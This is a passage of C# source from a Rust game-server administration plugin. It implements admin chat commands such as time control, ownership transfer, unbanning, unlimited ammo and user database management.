                Broadcast.Notice(Sender, "☢", "Teleportation by shots is disabled.", 5f);
            }
        }

        public static void Time(NetUser Sender, string Command, string[] Args)
        {
            if (((Args != null) && (Sender != null)) && ((Args.Length > 0) && Sender.admin))
            {
                float result = -1f;
                if (Args[0].Equals("freeze", StringComparison.OrdinalIgnoreCase))
                {
                    if ((float_0 == 0f) && (float_1 == 0f))
                    {
                        float_0 = env.daylength;
                        env.daylength = 1E+09f;
                        float_1 = env.nightlength;
                        env.nightlength = 1E+09f;
                        Broadcast.NoticeAll("☢", "Time in game has been freezed.", null, 5f);
                    }
                    else
                    {
                        env.daylength = float_0;
                        float_0 = 0f;
                        env.nightlength = float_1;
                        float_1 = 0f;
                        Broadcast.NoticeAll("☢", "Time in game has been unfreezed.", null, 5f);
                    }
                }
                else if (Args[0].Equals("unfreeze", StringComparison.OrdinalIgnoreCase))
                {
                    if ((float_0 != 0f) && (float_1 != 0f))
                    {
                        env.daylength = float_0;
                        float_0 = 0f;
                        env.nightlength = float_1;
                        float_1 = 0f;
                        Broadcast.NoticeAll("☢", "Time in game has been unfreezed.", null, 5f);
                    }
                }
                else if (Args[0].Equals("day", StringComparison.OrdinalIgnoreCase))
                {
                    EnvironmentControlCenter.Singleton.SetTime(12f);
                    Broadcast.NoticeAll("☢", "Time in game has been set on " + EnvironmentControlCenter.Singleton.sky.Cycle.DateTime.ToString("HH:mm") + " hour(s).", null, 5f);
                }
                else if (Args[0].Equals("night", StringComparison.OrdinalIgnoreCase))
                {
                    EnvironmentControlCenter.Singleton.SetTime(0f);
                    Broadcast.NoticeAll("☢", "Time in game has been set on " + EnvironmentControlCenter.Singleton.sky.Cycle.DateTime.ToString("HH:mm") + " hour(s).", null, 5f);
                }
                else if (float.TryParse(Args[0], out result))
                {
                    EnvironmentControlCenter.Singleton.SetTime(result);
                    Broadcast.NoticeAll("☢", "Time in game has been set on " + EnvironmentControlCenter.Singleton.sky.Cycle.DateTime.ToString("HH:mm") + " hour(s).", null, 5f);
                }
                else
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender) + " Syntax: /time [<hour>|day|night|freeze|unfreeze]", 5f);
                }
            }
            else
            {
                Broadcast.Message(Sender, "Time: " + EnvironmentControlCenter.Singleton.sky.Cycle.DateTime.ToString("HH:mm") + (((float_0 == 0f) || (float_1 == 0f)) ? "" : " (Freezed)"), null, 0f);
            }
        }

        public static void Transfer(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                UserData data = Users.Find(Args[0]);
                if ((data != null) && (!data.HasFlag(UserFlags.admin) || userData.HasFlag(UserFlags.admin)))
                {
                    if (!Sender.admin && (data.SteamID == Sender.userID))
                    {
                        Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Transfer.Self", Sender, null), 5f);
                    }
                    else
                    {
                        RaycastHit hit;
                        IDBase component = null;
                        string newValue = null;
                        ulong ownerID = 0L;
                        Ray eyesRay = Sender.playerClient.controllable.character.eyesRay;
                        float distance = Sender.admin ? 1000f : 10f;
                        if (Physics.Raycast(eyesRay, out hit, distance, -1))
                        {
                            component = hit.collider.GetComponent<IDBase>();
                        }
                        if (component == null)
                        {
                            Broadcast.Message(Sender, Config.GetMessage("Command.Transfer.Away", Sender, null), null, 0f);
                        }
                        else
                        {
                            DeployableObject idMain = component.idMain as DeployableObject;
                            StructureMaster master = component.idMain as StructureMaster;
                            if ((idMain == null) && (master == null))
                            {
                                Broadcast.Message(Sender, Config.GetMessage("Command.Transfer.SeeNothing", Sender, null), null, 0f);
                            }
                            else
                            {
                                if (idMain != null)
                                {
                                    ownerID = idMain.ownerID;
                                    newValue = Helper.NiceName(idMain.name);
                                }
                                if (master != null)
                                {
                                    ownerID = master.ownerID;
                                    newValue = Config.GetMessage("Command.Transfer.Building", Sender, null);
                                }
                                if (ownerID == data.SteamID)
                                {
                                    Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Transfer.AlreadyOwned", Sender, data.Username).Replace("%OBJECT%", newValue), 5f);
                                }
                                else if (!Sender.admin && (ownerID != userData.SteamID))
                                {
                                    Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Transfer.NotYourOwned", Sender, data.Username).Replace("%OBJECT%", newValue), 5f);
                                }
                                else
                                {
                                    if (idMain != null)
                                    {
                                        if (Core.CommandTransferForbidden.Contains<string>(newValue, StringComparer.CurrentCultureIgnoreCase))
                                        {
                                            Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Transfer.Forbidden", Sender, data.Username).Replace("%OBJECT%", newValue), 5f);
                                            return;
                                        }
                                        idMain.creatorID = idMain.ownerID = data.SteamID;
                                        idMain.CacheCreator();
                                    }
                                    if (master != null)
                                    {
                                        if (Core.CommandTransferForbidden.Contains<string>("Structure", StringComparer.CurrentCultureIgnoreCase))
                                        {
                                            Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Transfer.Forbidden", Sender, data.Username).Replace("%OBJECT%", newValue), 5f);
                                            return;
                                        }
                                        master.creatorID = master.ownerID = data.SteamID;
                                        master.CacheCreator();
                                    }
                                    Broadcast.Message(Sender, "You transfer " + newValue + " for \"" + data.Username + "\".", null, 0f);
                                }
                            }
                        }
                    }
                }
                else
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void Truth(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            NetUser player = Sender;
            if ((Args != null) && (Args.Length > 0))
            {
                player = Helper.GetNetUser(Args[0]);
            }
            if (player == null)
            {
                Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
            }
            else if (RustExtended.Truth.Exclude.Contains(player.userID))
            {
                RustExtended.Truth.Exclude.Remove(player.userID);
                Broadcast.Notice(player, "☢", "Truth Detector now ENABLED for you.", 5f);
                if (player != Sender)
                {
                    Broadcast.Notice(Sender, "✔", "Truth Detector now ENABLED for \"" + player.displayName + "\".", 5f);
                }
            }
            else
            {
                RustExtended.Truth.Exclude.Add(player.userID);
                Broadcast.Notice(player, "☢", "Truth Detector now DISABLED for you.", 5f);
                if (player != Sender)
                {
                    Broadcast.Notice(Sender, "✔", "Truth Detector now DISABLED for \"" + player.displayName + "\".", 5f);
                }
            }
        }

        public static void UnBan(NetUser Sender, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                if ((Args[0].ToLower() == "all") && Banned.Clear())
                {
                    if (Sender != null)
                    {
                        Helper.Log("All users has unbanned on server by \"" + Sender.displayName + "\"", true);
                    }
                    Broadcast.Notice(Sender, "✔", "All users has unbanned.", 5f);
                }
                else
                {
                    UserData data = Users.Find(Args[0]);
                    if (data == null)
                    {
                        Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                    }
                    else if (!Users.IsBanned(data.SteamID))
                    {
                        Broadcast.Notice(Sender, "✘", "User " + data.Username + " not banned.", 5f);
                    }
                    else
                    {
                        Users.Unban(data.SteamID);
                        Broadcast.Notice(Sender, "✔", "User " + data.Username + " was unbanned.", 5f);
                        if (Sender != null)
                        {
                            Helper.Log("\"" + data.Username + "\" was a unbanned by \"" + ((Sender != null) ? Sender.displayName : "SERVER") + "\"", true);
                        }
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void Unblock(NetUser Sender, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                if (!Regex.IsMatch(Args[0], @"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"))
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
                }
                else if (!Blocklist.Exists(Args[0]))
                {
                    Broadcast.Notice(Sender, "✘", "IP address " + Args[0] + " not blocked.", 5f);
                }
                else
                {
                    Blocklist.Remove(Args[0]);
                    Broadcast.Notice(Sender, "✔", "IP Address " + Args[0] + " has unblocked.", 5f);
                    if (Sender != null)
                    {
                        Helper.Log("\"IP address " + Args[0] + "\" has unblocked by \"" + ((Sender != null) ? Sender.displayName : "SERVER") + "\".", true);
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void UnlimitedAmmo(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length > 0))
            {
                userData = Users.Find(Args[0]);
            }
            if (userData == null)
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
            }
            else
            {
                NetUser user = NetUser.FindByUserID(userData.SteamID);
                if ((Args != null) && (Args.Length > 1))
                {
                    if (user == Sender)
                    {
                        Broadcast.Notice(Sender, "☢", "Shoot object updated", 5f);
                    }
                    else
                    {
                        Broadcast.Notice(Sender, "☢", userData.Username + "'s shoot object updated", 5f);
                    }
                    userData.HasShootObject = Args[1];
                }
                else
                {
                    userData.HasUnlimitedAmmo = !userData.HasUnlimitedAmmo;
                    if (userData.HasUnlimitedAmmo)
                    {
                        if (user != null)
                        {
                            PlayerInventory component = user.playerClient.controllable.GetComponent<PlayerInventory>();
                            if (component.activeItem != null)
                            {
                                int count = component.activeItem.datablock._maxUses - component.activeItem.uses;
                                if (count > 0)
                                {
                                    component.activeItem.AddUses(count);
                                }
                            }
                        }
                        if (user == Sender)
                        {
                            Broadcast.Notice(Sender, "☢", "Your ammo now is UNLIMITED for bullet weapons", 5f);
                        }
                        else
                        {
                            Broadcast.Notice(Sender, "☢", userData.Username + "'s ammo now is UNLIMITED for bullet weapons", 5f);
                        }
                    }
                    else if (user == Sender)
                    {
                        Broadcast.Notice(Sender, "☢", "Your unlimited ammo now is disabled", 5f);
                    }
                    else
                    {
                        Broadcast.Notice(Sender, "☢", userData.Username + "'s unlimited ammo now is disabled", 5f);
                    }
                }
            }
        }

        public static void Unmute(NetUser Sender, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                UserData data = Users.Find(Args[0]);
                if (data == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
                }
                else
                {
                    Countdown countdown = Users.CountdownGet(data.SteamID, "mute");
                    if (countdown == null)
                    {
                        Broadcast.Notice(Sender.networkPlayer, "☢", "User \"" + data.Username + "\" not muted.", 5f);
                    }
                    else
                    {
                        Users.CountdownRemove(data.SteamID, countdown);
                        Broadcast.Notice(Sender, "✔", "User \"" + data.Username + "\" is now unmuted.", 5f);
                        Broadcast.MessageAll(Config.GetMessage("Command.Mute.PlayerUnmuted", Sender, null).Replace("%TARGET%", data.Username));
                        Broadcast.Notice(NetUser.FindByUserID(data.SteamID), "☢", Config.GetMessage("Player.Unmuted", null, null), 5f);
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
            }
        }

        public static void Unshare(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            NetUser player = null;
            if (((Args != null) && (Args.Length != 0)) && ((Sender != null) || (Args.Length >= 2)))
            {
                UserData data = Users.Find(Args[Args.Length - 1]);
                if (((Sender == null) || Sender.admin) && (Args.Length > 1))
                {
                    userData = Users.Find(Args[0]);
                }
                if (userData == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else if (data == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[Args.Length - 1]), 5f);
                }
                else if (data.SteamID == userData.SteamID)
                {
                    Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Unshare.Self", Sender, null), 5f);
                }
                else if (!Users.SharedList(userData.SteamID).Contains(data.SteamID))
                {
                    Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Unshare.Already", Sender, Args[0]), 5f);
                }
                else if ((Sender != null) && (Sender.userID == userData.SteamID))
                {
                    Users.SharedRemove(userData.SteamID, data.SteamID);
                    player = NetUser.FindByUserID(data.SteamID);
                    if (player != null)
                    {
                        Broadcast.Notice(player, "☢", Config.GetMessage("Command.Unshare.Client", Sender, null), 5f);
                    }
                    Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Unshare.Owner", Sender, data.Username), 5f);
                }
                else
                {
                    Users.SharedRemove(userData.SteamID, data.SteamID);
                    Broadcast.Notice(Sender, "☢", userData.Username + "'s ownership is unshared for " + data.Username, 5f);
                    Sender = NetUser.FindByUserID(userData.SteamID);
                    player = NetUser.FindByUserID(data.SteamID);
                    if (Sender != null)
                    {
                        Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Unshare.Owner", Sender, null), 5f);
                    }
                    if (player != null)
                    {
                        Broadcast.Notice(player, "☢", Config.GetMessage("Command.Unshare.Client", Sender, null), 5f);
                    }
                }
            }
            else
            {
                if (Sender == null)
                {
                    userData = Users.Find(Args[0]);
                }
                foreach (ulong num in Users.SharedList(userData.SteamID))
                {
                    player = NetUser.FindByUserID(num);
                    if (player != null)
                    {
                        Broadcast.Notice(player, "☢", Config.GetMessage("Command.Unshare.Client", Sender, null), 5f);
                    }
                }
                Users.SharedClear(userData.SteamID);
                if (Sender == null)
                {
                    Broadcast.Notice(Sender, "☢", userData.Username + "'s ownership unshared for all.", 5f);
                }
                else
                {
                    Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Unshare.Clean", Sender, null), 5f);
                }
            }
        }

        public static void UserManage(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args == null) || (Args.Length == 0))
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
            }
            else
            {
                switch (Args[0])
                {
                    case "save":
                        if (Core.DatabaseType.Equals("FILE"))
                        {
                            Users.SaveAsTextFile();
                            Banned.SaveAsTextFile();
                            Blocklist.SaveAsTextFile();
                        }
                        if (!Core.DatabaseType.Equals("MYSQL"))
                        {
                            break;
                        }
                        ConsoleSystem.Print("Paused, server saving data into MySQL", false);
                        Users.SaveAsDatabaseSQL();
                        ConsoleSystem.Print("  - " + Users.Loaded + " Saved User(s)", false);
                        Banned.SaveAsDatabaseSQL();
                        ConsoleSystem.Print("  - " + Banned.Loaded + " Saved Banned User(s)", false);
                        Clans.SaveAsDatabaseSQL();
                        ConsoleSystem.Print("  - " + Clans.Loaded + " Saved Clan(s)", false);
                        Blocklist.SaveAsDatabaseSQL();
                        ConsoleSystem.Print("  - " + Blocklist.Count + " Saved Blocked IP", false);
                        ConsoleSystem.Print("Resumed.", false);
                        return;

                    case "load":
                        if (Core.DatabaseType.Equals("FILE"))
                        {
                            ConsoleSystem.Print("Loading User(s) from \"" + Users.SaveFilePath + "\"", false);
                            Users.LoadAsTextFile();
                            ConsoleSystem.Print("  - " + Users.Loaded + " Loaded User(s).", false);
                            Banned.LoadAsTextFile();
                            ConsoleSystem.Print("  - " + Banned.Loaded + " Banned User(s).", false);
                            Blocklist.LoadAsTextFile();
                        }
                        if (!Core.DatabaseType.Equals("MYSQL"))
                        {
                            break;
                        }
                        ConsoleSystem.Print("Loading User(s) from MySQL Database", false);
                        Users.LoadAsDatabaseSQL();
                        ConsoleSystem.Print("  - " + Users.Loaded + " Loaded User(s).", false);
                        Banned.LoadAsDatabaseSQL();
                        ConsoleSystem.Print("  - " + Banned.Loaded + " Banned User(s).", false);
                        Blocklist.LoadAsDatabaseSQL();
                        return;

                    case "import":
                        if (Args.Length >= 2)
                        {
                            if (Args[1].ToLower().Equals("file"))
                            {
                                ConsoleSystem.Print("Importing from \"" + Users.SaveFilePath + "\"", false);
                                Users.LoadAsTextFile();
                                ConsoleSystem.Print(Users.Loaded + " Imported User(s)", false);
                                Clans.LoadAsTextFile();
                                ConsoleSystem.Print(Clans.Loaded + " Imported Clan(s)", false);
                                Banned.LoadAsTextFile();
                                ConsoleSystem.Print(Banned.Loaded + " Imported Banned Users(s)", false);
                                Blocklist.LoadAsTextFile();
                                ConsoleSystem.Print(Blocklist.Count + " Imported Blocked IP", false);
                                return;
                            }
                            if (Args[1].ToLower().Equals("mysql"))
                            {
                                ConsoleSystem.Print("Importing from MySQL Database", false);
                                Users.LoadAsDatabaseSQL();
                                ConsoleSystem.Print(Users.Loaded + " Imported User(s)", false);
                                Clans.LoadAsDatabaseSQL();
                                ConsoleSystem.Print(Clans.Loaded + " Imported Clan(s)", false);
                                Banned.LoadAsDatabaseSQL();
                                ConsoleSystem.Print(Clans.Loaded + " Imported Banned Users(s)", false);
                                Blocklist.LoadAsDatabaseSQL();
                                ConsoleSystem.Print(Blocklist.Count + " Imported Blocked IP", false);
                                return;
                            }
                            Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                        return;

                    case "export":
                        if (Args.Length >= 2)
                        {
                            if (Args[1].ToLower().Equals("file"))
                            {
                                ConsoleSystem.Print("Exporting to \"" + Users.SaveFilePath + "\"", false);
                                ConsoleSystem.Print(Users.SaveAsTextFile() + " Exported User(s)", false);
                                ConsoleSystem.Print(Clans.SaveAsTextFile() + " Exported Clan(s)", false);
                                ConsoleSystem.Print(Banned.SaveAsTextFile() + " Exported Banned User(s)", false);
                                ConsoleSystem.Print(Blocklist.SaveAsTextFile() + " Exported Blocked IP(s)", false);
                                return;
                            }
                            if (Args[1].ToLower().Equals("mysql"))
                            {
                                ConsoleSystem.Print("Exporting to MySQL Database", false);
                                Users.SaveAsDatabaseSQL();
                                ConsoleSystem.Print(Users.Loaded + " Exported User(s).", false);
                                Clans.SaveAsDatabaseSQL();
                                ConsoleSystem.Print(Clans.Loaded + " Exported Clan(s).", false);
                                Banned.SaveAsDatabaseSQL();
                                ConsoleSystem.Print(Banned.Loaded + " Exported Banned Users(s).", false);
                                return;
                            }
                            Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                        return;

                    case "unused":
                        if (Args.Length >= 2)
                        {
                            int result = 0;
                            int num2 = 0;
                            if (int.TryParse(Args[1], out result))
                            {
                                foreach (UserData data2 in Users.All)
                                {
                                    TimeSpan span = (TimeSpan) (DateTime.Now - data2.LastConnectDate);
                                    if (span.Days > result)
                                    {
                                        string avatarFolder = ClusterServer.GetAvatarFolder(data2.SteamID);
                                        if (Directory.Exists(avatarFolder))
                                        {
                                            Directory.Delete(avatarFolder, true);
                                        }
                                        Users.Delete(data2.SteamID);
                                        num2++;
                                    }
                                }
                                Broadcast.Notice(Sender, "✘", "Removed " + num2 + " unused user(s).", 5f);
                                return;
                            }
                            Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                        return;

                    case "count":
                        Broadcast.Message(Sender, "Total count of recorded users: " + Users.Count, null, 0f);
                        return;

                    case "add":
                        if (Args.Length >= 3)
                        {
                            ulong num4 = 0L;
                            string username = Args[2];
                            string password = "";
                            string comments = "";
                            int num5 = 0;
                            UserFlags normal = UserFlags.normal;
                            string language = Core.Languages[0];
                            string str6 = "127.0.0.1";
                            DateTime now = DateTime.Now;
                            if (!ulong.TryParse(Args[1], out num4))
                            {
                                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                                return;
                            }
                            if (Users.GetBySteamID(num4) != null)
                            {
                                Broadcast.Notice(Sender, "✘", "User with this steam ID " + num4 + " already exists.", 5f);
                                return;
                            }
                            if (Users.GetByUserName(username) != null)
                            {
                                Broadcast.Notice(Sender, "✘", "User with this username " + username + " already exists.", 5f);
                                return;
                            }
                            if (Args.Length > 3)
                            {
                                password = Args[3];
                            }
                            if (Args.Length > 4)
                            {
                                comments = Args[4];
                            }
                            if ((Args.Length > 5) && !int.TryParse(Args[5], out num5))
                            {
                                num5 = 0;
                            }
                            if (Args.Length > 6)
                            {
                                normal = Args[6].ToEnum<UserFlags>();
                            }
                            if (Args.Length > 7)
                            {
                                language = Args[7];
                            }
                            if (Args.Length > 8)
                            {
                                str6 = Args[8];
                            }
                            if (Args.Length > 9)
                            {
                                now = DateTime.Parse(Args[9]);
                            }
                            Users.Add(num4, username, password, comments, num5, normal, language, str6, now);
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                        return;

                    default:
                    {
                        if (Args.Length < 2)
                        {
                            Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                            return;
                        }
                        UserData data = Users.Find(Args[0]);
                        if (data == null)
                        {
                            Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
                            return;
                        }
                        NetUser player = NetUser.FindByUserID(data.SteamID);
                        switch (Args[1].ToLower())
                        {
                            case "del":
                            case "delete":
                            case "remove":
                            {
                                Broadcast.Notice(Sender, "✔", "User " + data.Username + " removed.", 5f);
                                string path = ClusterServer.GetAvatarFolder(data.SteamID);
                                if (Directory.Exists(path))
                                {
                                    Directory.Delete(path, true);
                                }
                                Users.Delete(data.SteamID);
                                return;
                            }
                            case "id":
                                if (Args.Length >= 3)
                                {
                                    ulong num6 = 0L;
                                    if (ulong.TryParse(Args[2], out num6) && (num6 > 0x10ffeea14010000L))
                                    {
                                        if (Users.Database.ContainsKey(num6))
                                        {
                                            Broadcast.Notice(Sender, "✘", "User with steam ID " + num6 + " already exists", 5f);
                                            return;
                                        }
                                        if (Users.ChangeID(data.SteamID, num6))
                                        {
                                            Broadcast.Notice(Sender, "✔", string.Concat(new object[] { "Steam ID for ", data.Username, " changed on ", num6 }), 5f);
                                            return;
                                        }
                                        Broadcast.Notice(Sender, "✘", "Unknown Error!", 5f);
                                        return;
                                    }
                                    Broadcast.Notice(Sender, "✘", "Invalid new steam ID for change", 5f);
                                    return;
                                }
                                Broadcast.Message(Sender, string.Concat(new object[] { "User ", data.SteamID, " with name: ", data.SteamID }), null, 0f);
                                return;

                            case "username":
                                if (Args.Length >= 3)
                                {
                                    Broadcast.Notice(Sender, "✔", "You set new user name for " + data.Username + ", now name is " + Args[2], 5f);
                                    Users.SetUsername(data.SteamID, Args[2]);
                                    return;
                                }
                                Broadcast.Message(Sender, "User " + data.Username + " with username: " + data.Username, null, 0f);
                                return;

                            case "password":
                                if (Args.Length >= 3)
                                {
                                    Broadcast.Notice(Sender, "✔", "You set new password for " + data.Username, 5f);
                                    Users.SetPassword(data.SteamID, Args[2]);
                                    return;
                                }
                                Broadcast.Message(Sender, "User " + data.Username + " with password: " + data.Password, null, 0f);
                                return;

                            case "rank":
                                if (Args.Length >= 3)
                                {
                                    int rank = data.Rank;
                                    if (int.TryParse(Args[2], out rank) && Core.Ranks.ContainsKey(rank))
                                    {
                                        string str8 = Core.Ranks[rank];
                                        if (str8 == "")
                                        {
                                            str8 = rank.ToString();
                                        }
                                        if (!Core.Ranks.ContainsKey(rank))
                                        {
                                            Broadcast.Notice(Sender, "✔", "Rank " + rank + " not exists.", 5f);
                                            return;
                                        }
                                        if ((player != Sender) || (Sender == null))
                                        {
                                            Broadcast.Notice(Sender, "✔", "You set '" + str8 + "' rank for " + data.Username, 5f);
                                        }
                                        if (player != null)
                                        {
                                            Broadcast.Notice(player, "✔", "You now have rank is '" + str8 + "'", 5f);
                                        }
                                        Users.SetFlags(data.SteamID, UserFlags.godmode, (rank >= Users.AutoAdminRank) && Core.AdminGodmode);
                                        Users.SetFlags(data.SteamID, UserFlags.premium, data.PremiumDate.Ticks > 0L);
                                        Users.SetFlags(data.SteamID, UserFlags.admin, rank >= Users.AutoAdminRank);
                                        Users.SetFlags(data.SteamID, UserFlags.invis, false);
                                        if (player != null)
                                        {
                                            player.admin = data.HasFlag(UserFlags.admin);
                                        }
                                        Users.SetRank(data.SteamID, rank);
                                        return;
                                    }
                                    Broadcast.Notice(Sender, "✘", "Invalid argument, rank " + Args[2] + " not exists.", 5f);
                                    return;
                                }
                                Broadcast.Message(Sender, string.Concat(new object[] { "User ", data.Username, " with rank: ", data.Rank }), null, 0f);
                                return;

                            case "flags":
                                Broadcast.Message(Sender, string.Concat(new object[] { "User ", data.Username, " with flags: ", data.Flags }), null, 0f);
                                return;

                            case "flag":
                                if (Args.Length >= 3)
                                {
                                    switch (Args[2].ToLower())
                                    {
                                        case "normal":
                                            Users.ToggleFlag(data.SteamID, UserFlags.normal);
                                            Broadcast.Notice(Sender, "✔", "Flag 'normal' for " + data.Username + " has been " + (data.HasFlag(UserFlags.normal) ? "enabled" : "disabled"), 5f);
                                            return;

                                        case "premium":
                                            Users.ToggleFlag(data.SteamID, UserFlags.premium);
                                            Broadcast.Notice(Sender, "✔", "Flag 'premium' for " + data.Username + " has been " + (data.HasFlag(UserFlags.premium) ? "enabled" : "disabled"), 5f);
                                            return;

                                        case "whitelisted":
                                            Users.ToggleFlag(data.SteamID, UserFlags.whitelisted);
                                            Broadcast.Notice(Sender, "✔", "Flag 'whitelisted' for " + data.Username + " has been " + (data.HasFlag(UserFlags.whitelisted) ? "enabled" : "disabled"), 5f);
                                            return;

                                        case "banned":
                                            Users.ToggleFlag(data.SteamID, UserFlags.banned);
                                            Broadcast.Notice(Sender, "✔", "Flag 'banned' for " + data.Username + " has been " + (data.HasFlag(UserFlags.banned) ? "enabled" : "disabled"), 5f);
                                            return;

                                        case "admin":
                                            Users.ToggleFlag(data.SteamID, UserFlags.admin);
                                            Broadcast.Notice(Sender, "✔", "Flag 'admin' for " + data.Username + " has been " + (data.HasFlag(UserFlags.admin) ? "enabled" : "disabled"), 5f);
                                            return;

                                        case "nopvp":
                                            Users.ToggleFlag(data.SteamID, UserFlags.nopvp);
                                            Broadcast.Notice(Sender, "✔", "Flag 'nopvp' for " + data.Username + " has been " + (data.HasFlag(UserFlags.nopvp) ? "enabled" : "disabled"), 5f);
                                            return;

                                        case "safeboxes":
                                            Users.ToggleFlag(data.SteamID, UserFlags.safeboxes);
                                            Broadcast.Notice(Sender, "✔", "Flag 'safeboxes' for " + data.Username + " has been " + (data.HasFlag(UserFlags.safeboxes) ? "enabled" : "disabled"), 5f);
                                            return;
                                    }
                                    Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                                    return;
                                }
                                return;

                            case "comments":
                                if (Args.Length >= 3)
                                {
                                    Users.SetComments(data.SteamID, Args[2]);
                                    Broadcast.Notice(Sender, "✔", "You update comments for " + data.Username, 5f);
                                    return;
                                }
                                Broadcast.Message(Sender, "User " + data.Username + " with comments: " + data.Comments, null, 0f);
                                return;

                            case "violations":
                                if (Args.Length >= 3)
                                {
                                    Users.SetViolations(data.SteamID, int.Parse(Args[2]));
                                    Broadcast.Notice(Sender, "✔", "You update violations for " + data.Username, 5f);
                                    return;
                                }
                                Broadcast.Message(Sender, string.Concat(new object[] { "User ", data.Username, " with violations: ", data.Violations }), null, 0f);
                                return;

                            case "countdowns":
                                if (Args.Length >= 3)
                                {
                                    string str12;
                                    if (((str12 = Args[2].ToLower()) != null) && (str12 == "clear"))
                                    {
                                        Users.CountdownsClear(data.SteamID);
                                        Broadcast.Notice(Sender, "✔", "All countdowns cleared for " + data.Username, 5f);
                                        return;
                                    }
                                    Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                                    return;
                                }
                                Broadcast.Message(Sender, string.Concat(new object[] { "User ", data.Username, " with countdowns: ", Users.CountdownList(data.SteamID).Count<Countdown>() }), null, 0f);
                                return;

                            case "personal":
                                if (Args.Length >= 3)
                                {
                                    string str13;
                                    if (((str13 = Args[2].ToLower()) != null) && (str13 == "clear"))
                                    {
                                        Users.CountdownsClear(data.SteamID);
                                        Broadcast.Notice(Sender, "✔", "All personal items cleared for " + data.Username, 5f);
                                        return;
                                    }
                                    Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                                    return;
                                }
                                Broadcast.Message(Sender, string.Concat(new object[] { "User ", data.Username, " have personals: ", Users.PersonalList(data.SteamID).Count<KeyValuePair<string, int>>() }), null, 0f);
                                return;

                            case "ip":
                                if (Args.Length >= 3)
                                {
                                    if (!Regex.IsMatch(Args[2], @"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"))
                                    {
                                        Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                                        return;
                                    }
                                    Users.SetLastConnectIP(data.SteamID, Args[2]);
                                    Users.SetFirstConnectIP(data.SteamID, Args[2]);
                                    Broadcast.Notice(Sender, "✔", "You update first IP address for " + data.Username, 5f);
                                    return;
                                }
                                Broadcast.Message(Sender, "User " + data.Username + " with ip: " + data.LastConnectIP, null, 0f);
                                return;
                        }
                        Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                        break;
                    }
                }
            }
        }

        public static void Who(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            float distance = Sender.admin ? 1000f : 10f;
